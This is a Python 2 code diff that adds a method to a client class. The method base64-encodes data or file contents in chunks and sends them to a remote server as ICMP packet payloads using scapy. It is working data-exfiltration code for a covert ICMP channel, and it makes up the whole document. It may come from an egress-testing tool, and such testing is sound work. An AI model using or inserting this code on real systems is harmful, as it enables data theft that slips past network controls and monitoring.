@@ -31,6 +31,50 @@ class Client:
             else:
                 self.file_transfer = cli_object.file
 
+
+    def negotiatedTransmit(self, data_to_transmit,config=None):
+
+        byte_reader = 0
+        packet_number = 1
+
+        print("[+] Sending ICMP Data")
+        # Determine if sending via IP or domain name
+        if helpers.validate_ip(self.remote_server):
+            final_destination = self.remote_server
+        else:
+            print "[*] Resolving IP of domain..."
+            final_destination = socket.gethostbyname(self.remote_server)
+
+        # calcalate total packets
+        if ((len(data_to_transmit) % self.length) == 0):
+            total_packets = len(data_to_transmit) / self.length
+        else:
+            total_packets = (len(data_to_transmit) / self.length) + 1
+        self.current_total = total_packets
+
+        while (byte_reader < len(data_to_transmit)):
+            if not self.file_transfer:
+                encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+            else:
+                encoded_data = base64.b64encode(self.file_transfer +
+                    ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])
+
+            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
+
+            # Craft the packet with scapy
+            try:
+                send(IP(dst=final_destination)/ICMP()/(encoded_data), verbose=False)
+            except KeyboardInterrupt:
+                print "[*] Shutting down..."
+                sys.exit()
+
+            # Increment counters
+            byte_reader += self.length
+            packet_number += 1
+
+        return
+
+
     def transmit(self, data_to_transmit):
 
         byte_reader = 0
